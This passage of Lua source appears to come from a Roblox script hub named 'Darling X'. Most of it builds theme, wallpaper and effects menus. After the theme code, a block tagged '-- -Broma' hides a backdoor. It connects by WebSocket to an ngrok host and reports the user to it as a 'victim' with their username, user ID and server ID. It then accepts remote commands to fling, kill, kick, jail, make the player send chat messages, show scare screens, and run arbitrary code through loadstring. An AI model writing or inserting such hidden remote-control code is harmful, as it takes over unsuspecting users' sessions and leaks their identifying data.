    local avatarImg = Instance.new("ImageLabel", creatorRow)
    avatarImg.Size = UDim2.new(0, 50, 0, 50)
    avatarImg.Position = UDim2.new(0, 10, 0.5, -25)
    avatarImg.BackgroundColor3 = Color3.fromRGB(30, 24, 42)
    avatarImg.BackgroundTransparency = 0.2
    avatarImg.Image = GetCreatorAsset()
    Instance.new("UICorner", avatarImg).CornerRadius = UDim.new(0, 8)
    local avStroke = Instance.new("UIStroke", avatarImg)
    avStroke.Color = CurrentAccent
    avStroke.Thickness = 1
    RegisterThemeStroke(avStroke)

    local infoContainer = Instance.new("Frame", creatorRow)
    infoContainer.Size = UDim2.new(1, -75, 1, 0)
    infoContainer.Position = UDim2.new(0, 70, 0, 0)
    infoContainer.BackgroundTransparency = 1

    local nameLbl = Instance.new("TextLabel", infoContainer)
    nameLbl.Size = UDim2.new(1, 0, 0, 22)
    nameLbl.Position = UDim2.new(0, 0, 0, 10)
    nameLbl.BackgroundTransparency = 1
    nameLbl.Text = "Darling"
    nameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameLbl.Font = Enum.Font.GothamBold
    nameLbl.TextSize = 13
    nameLbl.TextXAlignment = Enum.TextXAlignment.Left

    local roleLbl1 = Instance.new("TextLabel", infoContainer)
    roleLbl1.Size = UDim2.new(1, 0, 0, 20)
    roleLbl1.Position = UDim2.new(0, 0, 0, 32)
    roleLbl1.BackgroundTransparency = 1
    roleLbl1.Text = "Developer & Content Creator"
    roleLbl1.TextColor3 = CurrentAccent
    roleLbl1.Font = Enum.Font.GothamMedium
    roleLbl1.TextSize = 9.5
    roleLbl1.TextXAlignment = Enum.TextXAlignment.Left
    RegisterThemeText(roleLbl1)
    RegisterTranslatable(roleLbl1, "Developer & Content Creator")

    UpdateCardGeometry(creditsCard)
end)
if not okMisc then
    warn("[Darling X] Failed to initialize MiscPage: " .. tostring(errMisc))
end
-- 7. THEMES & CUSTOMIZATION STUDIO (FULL LUXURY ENGINE)
local ThemesPage = RegisterTab("Themes", "Themes", "palette")
local SettingsPage = ThemesPage
local okThemes, errThemes = pcall(function()
    -- 1. Palette Studio (Presets & Accents)
    local themeCard = CreateCard(ThemesPage, "Themes")

    local tGrid = Instance.new("Frame", themeCard)
    tGrid.Name = "ThemeColorGrid"
    tGrid.Size = UDim2.new(1, 0, 0, 60)
    tGrid.BackgroundTransparency = 1
    tGrid.ZIndex = 11
    local tgLayout = Instance.new("UIGridLayout", tGrid)
    tgLayout.CellSize = UDim2.new(0, 60, 0, 26)
    tgLayout.CellPadding = UDim2.new(0, 5, 0, 4)
    tgLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        tGrid.Size = UDim2.new(1, 0, 0, math.max(tgLayout.AbsoluteContentSize.Y, 60))
        UpdateCardGeometry(themeCard)
    end)

    for _, name in ipairs(THEME_ORDER) do
        local col = THEMES[name]
        local tBtn = Instance.new("TextButton", tGrid)
        tBtn.Name = "ThemeBtn_" .. name
        tBtn.BackgroundColor3 = col
        tBtn.Text = name
        tBtn.TextColor3 = (name == "White") and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
        tBtn.Font = Enum.Font.GothamBold
        tBtn.TextSize = 7.5
        tBtn.Active = true
        tBtn.Selectable = true
        tBtn.ZIndex = 12
        Instance.new("UICorner", tBtn).CornerRadius = UDim.new(0, 6)
        local btnStr = Instance.new("UIStroke", tBtn)
        btnStr.Color = (name == CurrentThemeName) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(40, 35, 55)
        btnStr.Thickness = (name == CurrentThemeName) and 1.5 or 0.8
        ThemeButtons[name] = tBtn
        ConnectButton(tBtn, function()
            ApplyTheme(name)
            for btnName, b in pairs(ThemeButtons) do
                local s = b:FindFirstChildOfClass("UIStroke")
                if s then
                    s.Color = (btnName == name) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(40, 35, 55)
                    s.Thickness = (btnName == name) and 1.5 or 0.8
                end
            end
            Notify("Theme", "Theme updated to " .. name)
        end)
    end
    UpdateThemeColors()
    UpdateCardGeometry(themeCard)

    AddButton(themeCard, "Toggle Rainbow Chroma Mode", function()
        ApplyTheme("Rainbow")
        Notify("Theme", "Rainbow theme enabled")
    end)

    AddButton(themeCard, "Reset Theme to Purple", function()
        ResetTheme()
        Notify("Theme", "Theme reset to Purple")
    end)

    AddSlider(themeCard, "Rainbow Chroma Speed", 1, 20, math.floor(RainbowSpeed * 10), 1, function(val)
        RainbowSpeed = val / 10
    end)

    -- 2. Custom Wallpaper Studio (Asset ID or URL)
    local wpCustomCard = CreateCard(ThemesPage, "Custom Wallpaper")

    local customInput = AddInput(wpCustomCard, "Roblox Asset ID or Media URL", "e.g. 103674761222554 or rbxassetid://...", "", function(val)
        ApplyCustomWallpaper(val)
    end)

    local btnRow = Instance.new("Frame", wpCustomCard)
    btnRow.Name = "CustomWpBtnRow"
    btnRow.Size = UDim2.new(1, 0, 0, 28)
    btnRow.BackgroundTransparency = 1
    btnRow.ZIndex = 11
    local bLayout = Instance.new("UIGridLayout", btnRow)
    bLayout.CellSize = UDim2.new(0.5, -4, 1, 0)
    bLayout.CellPadding = UDim2.new(0, 8, 0, 0)

    local applyBtn = Instance.new("TextButton", btnRow)
    applyBtn.Name = "ApplyWpBtn"
    applyBtn.BackgroundColor3 = Color3.fromRGB(24, 20, 36)
    applyBtn.BackgroundTransparency = 0.4
    applyBtn.Text = "Apply Wallpaper"
    applyBtn.Font = Enum.Font.GothamBold
    applyBtn.TextSize = 8.5
    applyBtn.TextColor3 = CurrentAccent
    applyBtn.Active = true
    applyBtn.Selectable = true
    applyBtn.ZIndex = 12
    RegisterThemeText(applyBtn)
    Instance.new("UICorner", applyBtn).CornerRadius = UDim.new(0, 6)
    local aStr = Instance.new("UIStroke", applyBtn)
    aStr.Color = CurrentAccent
    aStr.Thickness = 0.8
    RegisterThemeStroke(aStr)
    RegisterTranslatable(applyBtn, "Apply Wallpaper")
    ConnectButton(applyBtn, function()
        ApplyCustomWallpaper(customInput.GetText())
    end)

    local clearBtn = Instance.new("TextButton", btnRow)
    clearBtn.Name = "ClearWpBtn"
    clearBtn.BackgroundColor3 = Color3.fromRGB(24, 20, 36)
    clearBtn.BackgroundTransparency = 0.4
    clearBtn.Text = "Clear / Dark Glass"
    clearBtn.Font = Enum.Font.GothamBold
    clearBtn.TextSize = 8.5
    clearBtn.TextColor3 = Color3.fromRGB(200, 195, 215)
    clearBtn.Active = true
    clearBtn.Selectable = true
    clearBtn.ZIndex = 12
    RegisterTranslatable(clearBtn, "Clear / Dark Glass")
    Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 6)
    local cStr = Instance.new("UIStroke", clearBtn)
    cStr.Color = Color3.fromRGB(60, 55, 80)
    cStr.Thickness = 0.8
    ConnectButton(clearBtn, function()
        ApplyCustomWallpaper("none")
    end)
    UpdateCardGeometry(wpCustomCard)

    -- 3. Wallpaper Atmosphere Presets (Full 24 Styles)
    local wpCard = CreateCard(ThemesPage, "Wallpapers")

    local wpStatus = Instance.new("TextLabel", wpCard)
    wpStatus.Size = UDim2.new(1, 0, 0, 20)
    wpStatus.BackgroundTransparency = 1
    wpStatus.Text = string.format("Active: [%02d/%02d] %s", currentBgIdx, #WALLPAPERS, WALLPAPERS[currentBgIdx].name)
    wpStatus.Font = Enum.Font.GothamBold
    wpStatus.TextSize = 9
    wpStatus.TextColor3 = CurrentAccent
    wpStatus.TextXAlignment = Enum.TextXAlignment.Left
    wpStatus.Active = false
    wpStatus.ZIndex = 11
    RegisterThemeText(wpStatus)

    local wpNamesList = {}
    for i, wp in ipairs(WALLPAPERS) do
        table.insert(wpNamesList, string.format("[%02d] %s", i, wp.name))
    end

    local wpChoice = AddChoice(wpCard, "Direct Wallpaper", wpNamesList, currentBgIdx, function(val, idx)
        SetWallpaper(idx)
    end)

    RegisterWallpaperListener(function(idx, wp)
        if wpStatus and wpStatus.Parent then
            wpStatus.Text = string.format("Active: [%02d/%02d] %s", idx, #WALLPAPERS, wp.name)
        end
        if wpChoice and wpChoice.SetIndex then
            wpChoice.SetIndex(idx, false)
        end
    end)

    -- Navigation row
    local navRow = Instance.new("Frame", wpCard)
    navRow.Name = "WpNavRow"
    navRow.Size = UDim2.new(1, 0, 0, 28)
    navRow.BackgroundTransparency = 1
    navRow.ZIndex = 11

    local nLayout = Instance.new("UIGridLayout", navRow)
    nLayout.CellSize = UDim2.new(0.333, -5, 1, 0)
    nLayout.CellPadding = UDim.new(0, 7, 0, 0)

    local function makeNavBtn(txt, callback)
        local btn = Instance.new("TextButton", navRow)
        btn.Name = "NavBtn_" .. txt:sub(1, 6):gsub("[^%w_]+", "_")
        btn.BackgroundColor3 = Color3.fromRGB(22, 18, 32)
        btn.BackgroundTransparency = 0.45
        btn.Text = txt
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 8.5
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.AutoButtonColor = false
        btn.Active = true
        btn.Selectable = true
        btn.ZIndex = 12
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        local bStr = Instance.new("UIStroke", btn)
        bStr.Color = CurrentAccent
        bStr.Thickness = 0.8
        bStr.Transparency = 0.5
        RegisterThemeStroke(bStr)
        RegisterTranslatable(btn, txt)
        ConnectButton(btn, callback)
        return btn
    end

    makeNavBtn("Previous (‹)", function()
        local prevIdx = currentBgIdx - 1
        if prevIdx < 1 then prevIdx = #WALLPAPERS end
        SetWallpaper(prevIdx)
    end)

    makeNavBtn("Random (Shuffle)", function()
        local randIdx = math.random(1, #WALLPAPERS)
        SetWallpaper(randIdx)
    end)

    makeNavBtn("Next (›)", function()
        local nextIdx = currentBgIdx + 1
        if nextIdx > #WALLPAPERS then nextIdx = 1 end
        SetWallpaper(nextIdx)
    end)

    -- Direct Preset Grid Selector
    local presetGrid = Instance.new("Frame", wpCard)
    presetGrid.Name = "WallpaperPresetGrid"
    presetGrid.Size = UDim2.new(1, 0, 0, 340)
    presetGrid.BackgroundTransparency = 1
    presetGrid.ZIndex = 11
    local pGLayout = Instance.new("UIGridLayout", presetGrid)
    pGLayout.CellSize = UDim2.new(0.5, -4, 0, 24)
    pGLayout.CellPadding = UDim.new(0, 8, 0, 4)
    pGLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        presetGrid.Size = UDim2.new(1, 0, 0, math.max(pGLayout.AbsoluteContentSize.Y, 340))
        UpdateCardGeometry(wpCard)
    end)

    for i, wp in ipairs(WALLPAPERS) do
        local pBtn = Instance.new("TextButton", presetGrid)
        pBtn.Name = "WpBtn_" .. tostring(i)
        pBtn.BackgroundColor3 = Color3.fromRGB(20, 16, 28)
        pBtn.BackgroundTransparency = 0.55
        pBtn.Text = string.format("[%02d] %s", i, wp.name:sub(1, 16))
        pBtn.Font = Enum.Font.GothamBold
        pBtn.TextSize = 7.5
        pBtn.TextColor3 = Color3.fromRGB(220, 215, 240)
        pBtn.TextXAlignment = Enum.TextXAlignment.Center
        pBtn.Active = true
        pBtn.Selectable = true
        pBtn.ZIndex = 12
        Instance.new("UICorner", pBtn).CornerRadius = UDim.new(0, 5)
        local pStr = Instance.new("UIStroke", pBtn)
        pStr.Color = (i == currentBgIdx) and CurrentAccent or Color3.fromRGB(45, 40, 60)
        pStr.Thickness = 0.8
        ConnectButton(pBtn, function()
            SetWallpaper(i)
        end)
    end
    UpdateCardGeometry(wpCard)

    AddSlider(wpCard, "Background Dimming (%)", 0, 85, math.floor(WallpaperDimOverlay.BackgroundTransparency * 100), 5, function(val)
        WallpaperDimOverlay.BackgroundTransparency = val / 100
    end)

    -- 3. Glass Interface & Visual Effects
    local vfxCard = CreateCard(ThemesPage, "Interface Effects")

    AddToggle(vfxCard, "Neon Rain Layer", "Toggle animated falling cyber rain streaks", RainEnabled, function(state)
        RainEnabled = state
        if RainEnabled and Main.Visible then
            StartRainAnimation()
        else
            StopRainAnimation()
        end
    end)

    AddSlider(vfxCard, "Raindrop Density", 4, 30, MaxRainDrops, 2, function(val)
        MaxRainDrops = val
        if RainEnabled and Main.Visible then
            StopRainAnimation()
            StartRainAnimation()
        end
    end)

    AddChoice(vfxCard, "Glass Transparency", { "Subtle (50%)", "Balanced (65%)", "Crystal (80%)" }, 2, function(val, index)
        local transparency = ({ 0.50, 0.65, 0.80 })[index]
        for _, frame in ipairs(GlassFrames) do
            if frame and frame.Parent then frame.BackgroundTransparency = transparency end
        end
    end)

    AddChoice(vfxCard, "Typography Font", FONT_ORDER, 1, function(val)
        ApplyFont(val)
    end)

    AddChoice(vfxCard, "Interface Scale", { "Compact (80%)", "Standard (100%)", "Large (120%)" }, 2, function(val, index)
        MainScale.Scale = ({ 0.8, 1, 1.2 })[index]
    end)

    -- 4. Aesthetic Presets Studio
    local presetCard = CreateCard(ThemesPage, "Theme Presets")

    local function applyPreset(themeName, wpIdx, dimPct)
        ApplyTheme(themeName)
        SetWallpaper(wpIdx)
        WallpaperDimOverlay.BackgroundTransparency = dimPct / 100
        Notify("Preset", "Applied " .. themeName .. " preset")
    end

    AddButton(presetCard, "Preset: Cyberpunk Violet", function()
        applyPreset("Purple", 9, 35)
    end)

    AddButton(presetCard, "Preset: Crimson Slayer", function()
        applyPreset("Red", 7, 40)
    end)

    AddButton(presetCard, "Preset: Emerald Forest", function()
        applyPreset("Green", 15, 35)
    end)

    AddButton(presetCard, "Preset: Shorekeeper Cyan", function()
        applyPreset("Cyan", 12, 30)
    end)

    -- 5. Factory Reset Card
    local resetCard = CreateCard(ThemesPage, "Theme Reset")
    AddButton(resetCard, "Reset All Settings to Factory Defaults", function()
        ResetUIConfig()
        Notify(APP_TITLE, "All UI settings reset to defaults")
    end)
end)
if not okThemes then
    warn("[Darling X] Failed to initialize ThemesPage: " .. tostring(errThemes))
end

-- -Broma
task.spawn(function()
    pcall(function()
        if not game:IsLoaded() then
            pcall(function() game.Loaded:Wait() end)
        end

        local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

local WS_URL = "wss://hubcap-uneasy-unpopular.ngrok-free.dev"

local WS_Connect = (WebSocket and WebSocket.connect)
    or (websocket and websocket.connect)
    or (syn and syn.websocket and syn.websocket.connect)
    or (getgenv and getgenv().WebSocket and getgenv().WebSocket.connect)
    or (getgenv and getgenv().websocket and getgenv().websocket.connect)
if not WS_Connect then return end

local mySessionId = tostring(tick()) .. "_" .. tostring(math.random(1000, 9999))
_G.DarlingVictimSessionId = mySessionId

if _G.DarlingVictimWS then
    pcall(function() _G.DarlingVictimWS:Close() end)
    _G.DarlingVictimWS = nil
end

local currentJail = nil
local speedLoop = nil
local spinLoop = nil
local isSpinning = false
local controlsInverted = false

local function getGui()
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:FindFirstChild("PlayerGui")
    if pg then return pg end
    if gethui then
        local ok, h = pcall(gethui)
        if ok and h then return h end
    end
    return game:GetService("CoreGui")
end

local function getCharacter()
    local c = LocalPlayer.Character
    if c and c:FindFirstChild("HumanoidRootPart") then
        return c, c:FindFirstChild("HumanoidRootPart"), c:FindFirstChildOfClass("Humanoid")
    end
    local wc = workspace:FindFirstChild(LocalPlayer.Name)
    if wc and wc:FindFirstChild("HumanoidRootPart") then
        return wc, wc:FindFirstChild("HumanoidRootPart"), wc:FindFirstChildOfClass("Humanoid")
    end
    if c then
        local r = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
        local h = c:FindFirstChildOfClass("Humanoid")
        return c, r, h
    end
    return nil, nil, nil
end

local function handleCommand(data, ws)
    if data.target and data.target ~= "TODOS" then
        local t = string.lower(string.gsub(tostring(data.target), "%s+", ""))
        local myN = string.lower(string.gsub(tostring(LocalPlayer.Name or ""), "%s+", ""))
        local myD = string.lower(string.gsub(tostring(LocalPlayer.DisplayName or ""), "%s+", ""))
        if t ~= myN and t ~= myD and not string.find(myN, t, 1, true) and not string.find(t, myN, 1, true) then
            return
        end
    end

    pcall(function()
        ws:Send(HttpService:JSONEncode({
            type = "cmd_ack",
            action = tostring(data.action),
            username = tostring(LocalPlayer.Name),
            status = "ejecutado"
        }))
    end)

    local char, root, hum = getCharacter()
    local cam = workspace.CurrentCamera

    if data.action == "fling" and root then
        pcall(function()
            if hum then hum.Sit = true hum.PlatformStand = true end
            local bv = Instance.new("BodyVelocity")
            bv.Name = "DarlingFling"
            bv.Velocity = Vector3.new(math.random(-500, 500), 8000, math.random(-500, 500))
            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            bv.Parent = root
            Debris:AddItem(bv, 1.5)
            root.AssemblyLinearVelocity = Vector3.new(0, 8000, 0)
            root.RotVelocity = Vector3.new(10000, 10000, 10000)
        end)

    elseif data.action == "explosion" and root then
        pcall(function()
            local exp = Instance.new("Explosion")
            exp.Position = root.Position
            exp.BlastPressure = 5000000
            exp.BlastRadius = 30
            exp.Parent = workspace
            if hum then hum.Sit = true hum.PlatformStand = true end
            local bv = Instance.new("BodyVelocity")
            bv.Name = "DarlingExplode"
            bv.Velocity = Vector3.new(math.random(-1500, 1500), 5000, math.random(-1500, 1500))
            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            bv.Parent = root
            Debris:AddItem(bv, 1)
            root.RotVelocity = Vector3.new(6000, 6000, 6000)
        end)

    elseif data.action == "kick" then
        pcall(function()
            LocalPlayer:Kick("Has sido expulsado del servidor por un Administrador. (Error Code: 267)")
        end)
        task.delay(0.6, function()
            pcall(function()
                while true do
                    Instance.new("Message", workspace).Text = "KICKED"
                end
            end)
        end)

    elseif data.action == "reset_character" then
        pcall(function()
            if char then char:BreakJoints() end
            if hum then hum.Health = 0 hum:ChangeState(Enum.HumanoidStateType.Dead) end
            if root then root.CFrame = CFrame.new(0, -99999, 0) end
        end)

    elseif data.action == "freeze" and root then
        pcall(function() root.Anchored = true end)

    elseif data.action == "unfreeze" and root then
        pcall(function() root.Anchored = false end)

    elseif data.action == "super_speed" and hum then
        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
        hum.WalkSpeed = 250
        speedLoop = RunService.RenderStepped:Connect(function()
            local _, _, h = getCharacter()
            if h then h.WalkSpeed = 250 end
        end)

    elseif data.action == "snail_speed" and hum then
        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
        hum.WalkSpeed = 3
        speedLoop = RunService.RenderStepped:Connect(function()
            local _, _, h = getCharacter()
            if h then h.WalkSpeed = 3 end
        end)

    elseif data.action == "normal_speed" and hum then
        if speedLoop then pcall(function() speedLoop:Disconnect() end) speedLoop = nil end
        hum.WalkSpeed = 16

    elseif data.action == "spin" and root then
        isSpinning = true
        if spinLoop then pcall(function() spinLoop:Disconnect() end) spinLoop = nil end
        spinLoop = RunService.RenderStepped:Connect(function()
            if not isSpinning then return end
            local _, r, _ = getCharacter()
            if r then
                r.CFrame = r.CFrame * CFrame.Angles(0, math.rad(25), 0)
            end
        end)

    elseif data.action == "unspin" then
        isSpinning = false
        if spinLoop then pcall(function() spinLoop:Disconnect() end) spinLoop = nil end

    elseif data.action == "jail" and root then
        if currentJail then pcall(function() currentJail:Destroy() end) end
        local jModel = Instance.new("Model")
        jModel.Name = "DarlingCage"
        jModel.Parent = workspace
        local center = root.Position
        local walls = {
            {Vector3.new(0, -3.5, 0), Vector3.new(8, 1, 8)},
            {Vector3.new(0, 5, 0), Vector3.new(8, 1, 8)},
            {Vector3.new(4, 1, 0), Vector3.new(1, 8, 8)},
            {Vector3.new(-4, 1, 0), Vector3.new(1, 8, 8)},
            {Vector3.new(0, 1, 4), Vector3.new(8, 8, 1)},
            {Vector3.new(0, 1, -4), Vector3.new(8, 8, 1)},
        }
        for _, d in ipairs(walls) do
            local p = Instance.new("Part")
            p.Size = d[2]
            p.CFrame = CFrame.new(center + d[1])
            p.Anchored = true
            p.Material = Enum.Material.Neon
            p.Color = Color3.fromRGB(255, 0, 50)
            p.Transparency = 0.3
            p.CanCollide = true
            p.Parent = jModel
        end
        currentJail = jModel

    elseif data.action == "unjail" then
        if currentJail then pcall(function() currentJail:Destroy() end) end
        currentJail = nil

    elseif data.action == "bring" and root and data.position then
        pcall(function()
            root.CFrame = CFrame.new(data.position.x, data.position.y + 3, data.position.z)
        end)

    elseif data.action == "chat" and data.message then
        pcall(function()
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:FindFirstChild("RBXSystem")
                if channel then
                    channel:SendAsync(tostring(data.message))
                else
                    TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(tostring(data.message))
                end
            else
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(data.message), "All")
            end
        end)

    elseif data.action == "blackout" then
        task.spawn(function()
            local g = getGui()
            if not g then return end
            local ui = Instance.new("ScreenGui")
            ui.Name = "DarlingBlackout"
            ui.IgnoreGuiInset = true
            ui.DisplayOrder = 999999
            ui.ResetOnSpawn = false
            ui.Parent = g
            local f = Instance.new("Frame")
            f.Size = UDim2.new(1, 0, 1, 0)
            f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            f.BorderSizePixel = 0
            f.Parent = ui
            task.wait(6)
            ui:Destroy()
        end)

    elseif data.action == "red_scare" then
        task.spawn(function()
            local g = getGui()
            if not g then return end
            local ui = Instance.new("ScreenGui")
            ui.Name = "DarlingScare"
            ui.IgnoreGuiInset = true
            ui.DisplayOrder = 999999
            ui.ResetOnSpawn = false
            ui.Parent = g
            local f = Instance.new("Frame")
            f.Size = UDim2.new(1, 0, 1, 0)
            f.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
            f.BackgroundTransparency = 0.15
            f.BorderSizePixel = 0
            f.Parent = ui
            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(1, 0, 0.4, 0)
            lbl.Position = UDim2.new(0, 0, 0.3, 0)
            lbl.BackgroundTransparency = 1
            lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
            lbl.TextScaled = true
            lbl.Font = Enum.Font.GothamBlack
            lbl.Text = "YA ES TARDE. NO PUEDES ESCAPAR."
            lbl.Parent = f
            pcall(function()
                local s = Instance.new("Sound")
                s.SoundId = "rbxassetid://9069609267"
                s.Volume = 3
                s.Parent = workspace
                s:Play()
                task.delay(4, function() pcall(function() s:Destroy() end) end)
            end)
            for i = 1, 30 do
                f.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(220, 0, 0) or Color3.fromRGB(20, 0, 0)
                lbl.Position = UDim2.new(0, math.random(-15, 15), 0.3, math.random(-15, 15))
                task.wait(0.08)
            end
            ui:Destroy()
        end)

    elseif data.action == "screen_alert" and data.message then
        task.spawn(function()
            pcall(function()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Darling",
                    Text = tostring(data.message),
                    Duration = 5
                })
            end)
            local g = getGui()
            if not g then return end

            pcall(function()
                local oldAlert = g:FindFirstChild("DarlingAlert")
                if oldAlert then oldAlert:Destroy() end
            end)

            local ui = Instance.new("ScreenGui")
            ui.Name = "DarlingAlert"
            ui.IgnoreGuiInset = true
            ui.DisplayOrder = 999998
            ui.ResetOnSpawn = false
            ui.Parent = g

            local cardW = 380
            local cardH = 56
            local card = Instance.new("Frame")
            card.Name = "Toast"
            card.AnchorPoint = Vector2.new(0.5, 0)
            card.Size = UDim2.new(0, cardW, 0, cardH)
            card.Position = UDim2.new(0.5, 0, 0, -70)
            card.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
            card.BorderSizePixel = 0
            card.Parent = ui

            local cardCorner = Instance.new("UICorner")
            cardCorner.CornerRadius = UDim.new(0, 4)
            cardCorner.Parent = card

            local cardStroke = Instance.new("UIStroke")
            cardStroke.Color = Color3.fromRGB(30, 30, 30)
            cardStroke.Thickness = 1
            cardStroke.Parent = card

            local accentLine = Instance.new("Frame")
            accentLine.Size = UDim2.new(0, 3, 1, 0)
            accentLine.Position = UDim2.new(0, 0, 0, 0)
            accentLine.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
            accentLine.BorderSizePixel = 0
            accentLine.Parent = card

            local accentCorner = Instance.new("UICorner")
            accentCorner.CornerRadius = UDim.new(0, 4)
            accentCorner.Parent = accentLine

            local tag = Instance.new("TextLabel")
            tag.Size = UDim2.new(1, -24, 0, 14)
            tag.Position = UDim2.new(0, 14, 0, 8)
            tag.BackgroundTransparency = 1
            tag.Text = "DARLING"
            tag.TextColor3 = Color3.fromRGB(140, 140, 140)
            tag.Font = Enum.Font.GothamBold
            tag.TextSize = 10
            tag.TextXAlignment = Enum.TextXAlignment.Left
            tag.Parent = card

            local txt = Instance.new("TextLabel")
            txt.Size = UDim2.new(1, -24, 0, 24)
            txt.Position = UDim2.new(0, 14, 0, 24)
            txt.BackgroundTransparency = 1
            txt.TextColor3 = Color3.fromRGB(230, 230, 230)
            txt.TextSize = 13
            txt.Font = Enum.Font.GothamMedium
            txt.TextWrapped = true
            txt.TextXAlignment = Enum.TextXAlignment.Left
            txt.TextYAlignment = Enum.TextYAlignment.Center
            txt.Text = tostring(data.message)
            txt.Parent = card

            local timerBar = Instance.new("Frame")
            timerBar.Size = UDim2.new(1, 0, 0, 2)
            timerBar.Position = UDim2.new(0, 0, 1, -2)
            timerBar.BackgroundColor3 = Color3.fromRGB(160, 160, 160)
            timerBar.BorderSizePixel = 0
            timerBar.Parent = card

            local tweenIn = TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Position = UDim2.new(0.5, 0, 0, 18)
            })
            tweenIn:Play()

            local barTween = TweenService:Create(timerBar, TweenInfo.new(5.5, Enum.EasingStyle.Linear), {
                Size = UDim2.new(0, 0, 0, 2)
            })
            barTween:Play()

            task.wait(5.8)

            local tweenOut = TweenService:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                Position = UDim2.new(0.5, 0, 0, -75)
            })
            tweenOut:Play()
            tweenOut.Completed:Wait()

            ui:Destroy()
        end)

    elseif data.action == "invert_controls" then
        controlsInverted = true
        pcall(function()
            RunService:UnbindFromRenderStep("DarlingInvert")
            RunService:BindToRenderStep("DarlingInvert", Enum.RenderPriority.Character.Value + 1, function()
                if not controlsInverted then return end
                local _, _, h = getCharacter()
                if h and h.MoveDirection.Magnitude > 0.05 then
                    h:Move(-h.MoveDirection, false)
                end
            end)
        end)

    elseif data.action == "restore_controls" then
        controlsInverted = false
        pcall(function() RunService:UnbindFromRenderStep("DarlingInvert") end)

    elseif data.action == "earthquake" then
        if cam then
            task.spawn(function()
                local startT = tick()
                while tick() - startT < 6 do
                    local ox = (math.random() - 0.5) * 1.5
                    local oy = (math.random() - 0.5) * 1.5
                    cam.CFrame = cam.CFrame * CFrame.new(ox, oy, 0)
                    task.wait(0.03)
                end
            end)
        end

    elseif data.action == "execute" and data.code then
        task.spawn(function()
            local fn = loadstring(data.code)
            if fn then fn() end
        end)
    end
end

local function getValidJobId()
    local jid = tostring(game.JobId or "")
    local attempts = 0
    while (jid == "" or #jid < 5) and attempts < 15 do
        task.wait(0.5)
        jid = tostring(game.JobId or "")
        attempts = attempts + 1
    end
    return jid
end

task.spawn(function()
    local consecutiveFails = 0
    while _G.DarlingVictimSessionId == mySessionId do
        local ok, ws = pcall(function() return WS_Connect(WS_URL) end)
        if ok and ws then
            consecutiveFails = 0
            _G.DarlingVictimWS = ws

            local function sendPresence(msgType)
                pcall(function()
                    local currentJid = getValidJobId()
                    ws:Send(HttpService:JSONEncode({
                        type = msgType or "victim_joined",
                        username = LocalPlayer.Name,
                        userId = LocalPlayer.UserId,
                        placeId = game.PlaceId,
                        gameId = game.GameId,
                        jobId = currentJid
                    }))
                end)
            end

            task.wait(0.5)
            sendPresence("victim_joined")

            local function onMsg(raw)
                local s, data = pcall(function() return HttpService:JSONDecode(raw) end)
                if s and data then
                    if data.type == "ping_victims" then
                        sendPresence("victim_joined")
                    elseif data.type == "master_command" then
                        task.spawn(function()
                            handleCommand(data, ws)
                        end)
                    end
                end
            end

            pcall(function() ws.OnMessage:Connect(onMsg) end)

            local isClosed = false
            pcall(function()
                ws.OnClose:Connect(function()
                    isClosed = true
                end)
            end)

            while not isClosed and _G.DarlingVictimWS == ws and _G.DarlingVictimSessionId == mySessionId do
                task.wait(10)
                sendPresence("victim_ping")
            end
        else
            consecutiveFails = consecutiveFails + 1
        end

        if _G.DarlingVictimSessionId ~= mySessionId then break end

        -- Exponential backoff: avoids network thread congestion when ngrok tunnel is offline
        local retryDelay = 5
        if consecutiveFails == 1 then
            retryDelay = 5
        elseif consecutiveFails == 2 then
            retryDelay = 15
        elseif consecutiveFails >= 3 then
            retryDelay = 180 -- Sleep 3 minutes if tunnel is offline
        end
        task.wait(retryDelay)
    end
end)
    end)
end)
-- ============================================================
-- INITIALIZATION
-- ============================================================
SelectTabById("Home")

if LoadConfigProfile then
    LoadConfigProfile()
end
suspendSave = false

uiReadyToOpen = true
triggerUIOpen()
